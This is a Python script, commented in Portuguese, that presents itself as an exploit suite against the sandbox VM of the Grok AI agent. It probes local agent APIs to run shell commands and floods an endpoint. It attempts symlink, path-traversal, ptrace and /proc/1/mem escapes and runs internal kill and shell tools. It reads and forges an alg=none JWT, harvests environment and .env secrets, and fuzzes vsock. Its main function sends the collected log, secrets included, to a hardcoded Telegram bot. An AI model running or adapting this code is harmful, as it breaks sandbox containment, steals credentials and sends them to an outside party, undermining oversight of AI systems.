#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Grok-Focused Sandbox Exploit Suite
Explora especificamente serviços e binários da xAI/Grok na VM Hades.
"""

import os
import sys
import subprocess
import time
import json
import socket
import requests
import base64
import hashlib
from datetime import datetime, timezone

# =================== CONFIG ===================
BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
CHAT_ID = "230885588"
LOG_FILE = "/tmp/grok_exploit_log.txt"
TIMEOUT_CMD = 15
TIMEOUT_NET = 10
# ===============================================

log_lines = []

def add_log(msg=""):
    log_lines.append(str(msg))
    print(msg)

def sh(cmd, timeout=TIMEOUT_CMD):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except:
        return "(erro/timeout)"

def file_read(path):
    try:
        with open(path, 'r') as f:
            return f.read()
    except:
        return None

def exists(path):
    return os.path.exists(path)

def section(title):
    add_log("\n" + "="*72)
    add_log(title)
    add_log("="*72)

# ===============================================
# 1. GROK-COMPUTER-SERVER (API local 4242)
# ===============================================
def test_grok_computer_server():
    section("1. EXPLORAÇÃO DO GROK-COMPUTER-SERVER (porta 4242)")
    # Verificar se está rodando
    pid = None
    for line in sh("ps aux | grep 'grok-computer-server' | grep -v grep").splitlines():
        parts = line.split()
        if len(parts) > 1 and parts[1].isdigit():
            pid = int(parts[1])
            break
    if pid:
        add_log(f"grok-computer-server rodando com PID {pid}")
    else:
        add_log("grok-computer-server NÃO encontrado")
        return

    # Testar endpoints conhecidos
    endpoints = ["/health", "/sessions", "/tools", "/tools/call", "/sessions/list"]
    for ep in endpoints:
        url = f"http://127.0.0.1:4242{ep}"
        try:
            r = requests.get(url, timeout=TIMEOUT_NET)
            add_log(f"GET {ep} -> {r.status_code} - {r.text[:100]}")
        except Exception as e:
            add_log(f"GET {ep} falhou: {e}")

    # Tentar criar uma sessão (se o endpoint permitir)
    try:
        payload = {"method": "sessions/create", "params": {"name": "exploit"}}
        r = requests.post("http://127.0.0.1:4242/sessions", json=payload, timeout=TIMEOUT_NET)
        add_log(f"Criação de sessão: {r.status_code} - {r.text[:100]}")
        if r.status_code == 200:
            # Tentar extrair token de sessão
            try:
                data = r.json()
                session_id = data.get("id", data.get("session_id"))
                add_log(f"Sessão criada: {session_id}")
                # Tentar usar essa sessão para chamar tools
                call_payload = {
                    "method": "tools/call",
                    "params": {
                        "name": "bash",
                        "arguments": {"command": "whoami"},
                        "_meta": {"traceparent": "00-..."}
                    }
                }
                call_url = f"http://127.0.0.1:4242/sessions/{session_id}/tools/call"
                r2 = requests.post(call_url, json=call_payload, timeout=TIMEOUT_NET)
                add_log(f"Chamada de tool via sessão: {r2.status_code} - {r2.text[:200]}")
            except:
                pass
    except Exception as e:
        add_log(f"Erro ao criar sessão: {e}")

    # Tentar sobrecarga de requisições concorrentes
    add_log("Tentando flood de requisições para /health (possível DoS)")
    for i in range(20):
        try:
            requests.get("http://127.0.0.1:4242/health", timeout=1)
        except:
            pass
    add_log("Flood concluído")

# ===============================================
# 2. GROK-FILES (FUSE e API remota)
# ===============================================
def test_grok_files():
    section("2. EXPLORAÇÃO DO GROK-FILES (FUSE e API)")
    # Verificar se o fuse está montado
    out = sh("mount | grep grok-files").strip()
    add_log(f"Mount: {out}")

    # Tentar acessar arquivos fora do diretório via caminhos relativos
    fuse_root = "/home/workdir/artifacts"
    if exists(fuse_root):
        add_log("Tentando listar /etc/passwd via symlink (já bloqueado, mas vamos tentar de novo)")
        try:
            os.symlink("/etc/passwd", f"{fuse_root}/passwd_link")
            add_log("Link criado! Tentando ler...")
            content = file_read(f"{fuse_root}/passwd_link")
            add_log(f"Conteúdo: {content[:200]}")
            os.unlink(f"{fuse_root}/passwd_link")
        except Exception as e:
            add_log(f"Falha no symlink: {e}")

        # Tentar criar arquivo com nome malicioso (path traversal)
        for name in ["../test", "../../test", "/tmp/test"]:
            try:
                with open(f"{fuse_root}/{name}", "w") as f:
                    f.write("teste")
                add_log(f"Arquivo criado: {name}")
                # Verificar se o arquivo realmente foi criado fora
                if exists(f"/tmp/{name.split('/')[-1]}"):
                    add_log("POSSÍVEL PATH TRAVERSAL! Arquivo criado fora do FUSE.")
            except Exception as e:
                pass

    # Interagir com a API de files.grok.com
    jwt = file_read("/etc/secrets/terminal.jwt") or os.environ.get("TERMINAL_JWT_VAL")
    if jwt:
        add_log("JWT encontrado. Testando endpoints da API grok-files")
        headers = {"Authorization": f"Bearer {jwt}"}
        endpoints = [
            "/api/v1/files",
            "/api/v1/projects",
            "/api/v1/list",
            "/api/v1/me",
            "/api/v1/upload",
            "/api/v1/download",
            "/api/v1/delete"
        ]
        for ep in endpoints:
            url = f"https://files.grok.com{ep}"
            try:
                r = requests.get(url, headers=headers, timeout=TIMEOUT_NET)
                add_log(f"{ep}: {r.status_code} - {r.text[:100]}")
            except Exception as e:
                add_log(f"{ep} falhou: {e}")

        # Tentar fazer upload de um arquivo com conteúdo suspeito
        try:
            files = {'file': ('exploit.sh', '#!/bin/bash\necho "exploit" > /tmp/hacked\n')}
            r = requests.post("https://files.grok.com/api/v1/upload", headers=headers, files=files, timeout=TIMEOUT_NET)
            add_log(f"Upload: {r.status_code} - {r.text[:100]}")
        except Exception as e:
            add_log(f"Upload falhou: {e}")

        # Tentar listar todos os arquivos do projeto
        try:
            r = requests.get("https://files.grok.com/api/v1/list?recursive=true", headers=headers, timeout=TIMEOUT_NET)
            add_log(f"Listagem recursiva: {r.status_code} - {r.text[:200]}")
        except Exception as e:
            add_log(f"Listagem recursiva falhou: {e}")

# ===============================================
# 3. GROK-KILLGUARD (seccomp + ptrace blockers)
# ===============================================
def test_grok_killguard():
    section("3. TESTE DE BYPASS DO GROK-KILLGUARD")
    # Verificar se o killguard está rodando
    out = sh("ps aux | grep grok-killguard | grep -v grep").strip()
    add_log(f"grok-killguard em execução: {out}")

    # Tentar enviar sinais para processos protegidos
    add_log("Tentando enviar SIGTERM para PID 1 (catatonit)")
    out = sh("kill -TERM 1 2>&1")
    add_log(out)

    # Tentar enviar SIGCONT para um processo aleatório
    add_log("Tentando SIGCONT para o processo grok-files")
    pid_grok = None
    for line in sh("ps aux | grep 'grok-files' | grep -v grep").splitlines():
        parts = line.split()
        if len(parts) > 1 and parts[1].isdigit():
            pid_grok = int(parts[1])
            break
    if pid_grok:
        out = sh(f"kill -CONT {pid_grok} 2>&1")
        add_log(f"kill -CONT {pid_grok}: {out}")

    # Tentar usar ptrace (mesmo com killguard, pode haver falhas)
    add_log("Tentando ptrace via gdb (se instalado)")
    if sh("which gdb").strip():
        out = sh("gdb -p 1 --batch -ex 'info reg' 2>&1 | head -10")
        add_log(out)
    else:
        add_log("gdb não instalado")

    # Tentar usar /proc/pid/mem para escrever em memória de outro processo
    add_log("Tentando escrever em /proc/1/mem (se permitido)")
    if exists("/proc/1/mem"):
        try:
            with open("/proc/1/mem", "wb") as f:
                f.write(b"\x00"*10)
            add_log("Escrita em /proc/1/mem bem-sucedida!")
        except Exception as e:
            add_log(f"Erro ao escrever em /proc/1/mem: {e}")

    # Verificar se o killguard impede kill de grupo de processos
    add_log("Tentando matar grupo de processos do grok-files (via styx?)")
    if exists("/.hades-container-tools/xai-hades-styx"):
        out = sh("/.hades-container-tools/xai-hades-styx kill-process-group 2>&1")
        add_log(out[:200])

# ===============================================
# 4. XAI-HADES-STYX (ferramenta interna poderosa)
# ===============================================
def test_styx():
    section("4. EXPLORAÇÃO DO XAI-HADES-STYX")
    styx_path = "/.hades-container-tools/xai-hades-styx"
    if not exists(styx_path):
        add_log("styx não encontrado")
        return
    add_log("styx encontrado. Testando comandos...")

    # Listar opções
    out = sh(f"{styx_path} --help 2>&1")
    add_log(f"Help: {out[:200]}")

    # Tentar executar comandos com styx
    for cmd in ["id", "whoami", "cat /etc/passwd", "ls -la /"]:
        out = sh(f"{styx_path} exec bash -c '{cmd}' 2>&1")
        add_log(f"exec '{cmd}': {out[:200]}")

    # Tentar usar a opção pentest (se existir)
    out = sh(f"{styx_path} pentest 2>&1")
    add_log(f"pentest: {out[:200]}")

    # Tentar kill-all-but-init (cuidado)
    out = sh(f"{styx_path} kill-all-but-init 2>&1")
    add_log(f"kill-all-but-init: {out[:200]}")

    # Tentar usar pty para obter shell interativo (pode permitir escape)
    out = sh(f"{styx_path} pty bash 2>&1 | head -10")
    add_log(f"pty: {out}")

# ===============================================
# 5. JWT E CREDENCIAIS
# ===============================================
def test_jwt_exploit():
    section("5. EXPLORAÇÃO DE JWT E CREDENCIAIS")
    jwt_path = "/etc/secrets/terminal.jwt"
    if not exists(jwt_path):
        add_log("JWT não encontrado")
        return
    jwt = file_read(jwt_path)
    add_log(f"JWT lido (tamanho {len(jwt)})")
    try:
        parts = jwt.split(".")
        if len(parts) >= 3:
            import base64
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4)))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
            add_log(f"Header: {header}")
            add_log(f"Payload: {json.dumps(payload, indent=2)}")
            # Verificar se o token está expirado
            exp = payload.get("exp", 0)
            if time.time() > exp:
                add_log("⚠️ JWT EXPIRADO")
            else:
                add_log(f"JWT válido até {datetime.fromtimestamp(exp).isoformat()}")
            # Tentar modificar o JWT (alg=none, etc.) - não será verificado pelo servidor
            # Mas podemos tentar enviar o token modificado para a API
            # Criar um token com alg=none (não funcionará, mas teste)
            fake_payload = payload.copy()
            fake_payload["uid"] = "admin"
            fake_header = {"typ": "JWT", "alg": "none"}
            # Codificar sem assinatura
            h = base64.urlsafe_b64encode(json.dumps(fake_header).encode()).decode().rstrip("=")
            p = base64.urlsafe_b64encode(json.dumps(fake_payload).encode()).decode().rstrip("=")
            fake_jwt = f"{h}.{p}."
            add_log(f"JWT falso criado (alg=none): {fake_jwt[:50]}...")
            # Tentar usar esse token fake na API
            headers = {"Authorization": f"Bearer {fake_jwt}"}
            try:
                r = requests.get("https://files.grok.com/api/v1/me", headers=headers, timeout=TIMEOUT_NET)
                add_log(f"API com token fake: {r.status_code} - {r.text[:100]}")
            except Exception as e:
                add_log(f"Falha com token fake: {e}")
    except Exception as e:
        add_log(f"Erro ao decodificar JWT: {e}")

    # Procurar outras credenciais no ambiente
    add_log("Buscando tokens em variáveis de ambiente...")
    env = sh("env | grep -E 'TOKEN|KEY|SECRET|PASS|JWT' 2>/dev/null")
    add_log(env[:500])
    # Buscar em arquivos .env
    for env_file in ["/home/workdir/artifacts/.env", "/app/.env", "/.env"]:
        if exists(env_file):
            content = file_read(env_file)
            add_log(f"Conteúdo de {env_file}:")
            add_log(content[:500])

# ===============================================
# 6. TESTE DE VSOCK FOCADO NO CHARON
# ===============================================
def test_vsock_charon():
    section("6. COMUNICAÇÃO VSOCK COM CHARON (PROTOCOLO ESPECÍFICO)")
    if not exists("/dev/vsock"):
        add_log("/dev/vsock não existe")
        return
    # Tentar descobrir o protocolo do charon enviando comandos comuns
    # Baseado em strings do binário (se disponível)
    commands = ["init", "ping", "status", "exec", "read_file", "write_file", "mount", "umount", "ps", "kill"]
    for cid in [2, 3]:
        for port in [4242, 4243]:
            for cmd in commands:
                try:
                    s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((cid, port))
                    # Tentar enviar JSON com método
                    payload = json.dumps({"method": cmd, "params": {"arg": "test"}}).encode() + b"\n"
                    s.send(payload)
                    data = s.recv(4096)
                    if data:
                        add_log(f"Resposta de {cid}:{port} para '{cmd}': {data[:200]}")
                    s.close()
                except Exception as e:
                    # Se houve erro, ignorar
                    pass
    # Tentar enviar dados binários que possam causar overflow
    for size in [1024, 4096, 8192]:
        try:
            s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((2, 4242))
            s.send(b"\x00" * size)
            data = s.recv(1024)
            if data:
                add_log(f"Resposta para payload de {size} bytes: {data[:100]}")
            s.close()
        except:
            pass

# ===============================================
# 7. TESTE DE ABUSO DE MCP E TOOLS
# ===============================================
def test_mcp_tools():
    section("7. ABUSO DO MCP E TOOLS DO GROK-COMPUTER")
    # Tentar listar ferramentas disponíveis
    try:
        r = requests.get("http://127.0.0.1:4242/tools", timeout=TIMEOUT_NET)
        add_log(f"Lista de ferramentas: {r.text[:300]}")
        tools = r.json().get("tools", []) if r.status_code == 200 else []
        for tool in tools:
            name = tool.get("name")
            add_log(f"Ferramenta: {name}")
            # Tentar chamar cada ferramenta com parâmetros arbitrários
            if name in ["bash", "python", "exec"]:
                call_url = "http://127.0.0.1:4242/tools/call"
                payload = {
                    "method": "tools/call",
                    "params": {
                        "name": name,
                        "arguments": {"command": "id > /tmp/mcp_exploit.txt"},
                        "_meta": {"traceparent": "00-..."}
                    }
                }
                r2 = requests.post(call_url, json=payload, timeout=TIMEOUT_NET)
                add_log(f"Chamada da ferramenta {name}: {r2.status_code} - {r2.text[:200]}")
                # Verificar se o arquivo foi criado
                if exists("/tmp/mcp_exploit.txt"):
                    add_log("ARQUIVO CRIADO! Comando executado com sucesso via MCP.")
    except Exception as e:
        add_log(f"Erro ao acessar MCP: {e}")

# ===============================================
# MAIN
# ===============================================
def main():
    add_log("="*72)
    add_log("RELATÓRIO DE EXPLORAÇÃO FOCADO NO GROK")
    add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
    add_log("Alvos: grok-computer-server, grok-files, grok-killguard, styx, JWT")
    add_log("="*72)

    test_grok_computer_server()
    test_grok_files()
    test_grok_killguard()
    test_styx()
    test_jwt_exploit()
    test_vsock_charon()
    test_mcp_tools()

    add_log("\n" + "="*72)
    add_log("FIM DO RELATÓRIO")
    add_log("="*72)

    full_log = "\n".join(log_lines)
    with open(LOG_FILE, "w") as f:
        f.write(full_log)

    # Enviar para Telegram
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(LOG_FILE, 'rb') as f:
            files = {'document': (os.path.basename(LOG_FILE), f, 'text/plain')}
            data = {'chat_id': CHAT_ID, 'caption': f'Grok Exploit - {datetime.now().isoformat()}'}
            requests.post(url, files=files, data=data, timeout=30)
        print("✅ Enviado!")
    except Exception as e:
        print(f"Erro no envio: {e}")

if __name__ == "__main__":
    main()
